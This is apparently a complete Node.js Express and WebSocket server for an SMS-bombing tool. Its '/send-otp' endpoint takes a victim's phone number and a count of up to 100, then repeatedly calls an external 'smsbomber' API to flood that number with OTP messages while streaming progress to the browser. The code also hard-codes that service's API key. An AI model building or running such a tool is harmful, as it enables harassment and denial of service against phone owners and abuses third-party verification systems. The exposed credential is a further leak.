const express = require('express');
const cors = require('cors');
const crypto = require('crypto');
const http = require('http');
const https = require('https');
const { WebSocketServer } = require('ws');

const app = express();
const PORT = 8080;
const API_KEY = 'b7803e277f88d59c3ee050bd866aa2eeaa1a6100bf60a8bca9474b886fceb9d8';

app.use(cors());
app.use(express.json());
app.use(express.static('public'));

const server = http.createServer(app);
const wss = new WebSocketServer({ server });
const clients = new Map();

wss.on('connection', (ws) => {
  ws.on('message', (msg) => {
    try {
      const { session } = JSON.parse(msg);
      if (session) clients.set(session, ws);
    } catch {}
  });

  ws.on('close', () => {
    for (const [sid, sock] of clients.entries()) {
      if (sock === ws) clients.delete(sid);
    }
  });
});

function httpsGetJson(apiUrl) {
  return new Promise((resolve, reject) => {
    https.get(apiUrl, (res) => {
      let raw = '';
      res.on('data', chunk => raw += chunk);
      res.on('end', () => {
        try {
          const data = JSON.parse(raw);
          resolve(data);
        } catch {
          reject(new Error('Invalid JSON from API'));
        }
      });
    }).on('error', reject);
  });
}

app.post('/send-otp', async (req, res) => {
  const { phone, count } = req.body;
  const sessionId = crypto.randomBytes(6).toString('hex');

  if (!phone || !count || isNaN(count)) {
    return res.status(400).json({ success: false, message: 'Invalid phone or count' });
  }

  const safeCount = Math.min(parseInt(count), 100);
  res.json({ success: true, session: sessionId });

  for (let i = 1; i <= safeCount; i++) {
    try {
      const apiUrl = `https://haji-mix-api.gleeze.com/api/smsbomber?phone=${phone}&amount=1&api_key=${API_KEY}`;
      const result = await httpsGetJson(apiUrl);

      const client = clients.get(sessionId);
      if (client?.readyState === 1) {
        client.send(JSON.stringify({
          index: i,
          success: result.status,
          message: result.message,
          percent: Math.round((i / safeCount) * 100)
        }));
      }
    } catch (err) {
      const client = clients.get(sessionId);
      if (client?.readyState === 1) {
        client.send(JSON.stringify({
          index: i,
          success: false,
          message: err.message,
          percent: Math.round((i / safeCount) * 100)
        }));
      }
    }

    await new Promise(r => setTimeout(r, 300));
  }
});

server.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
});
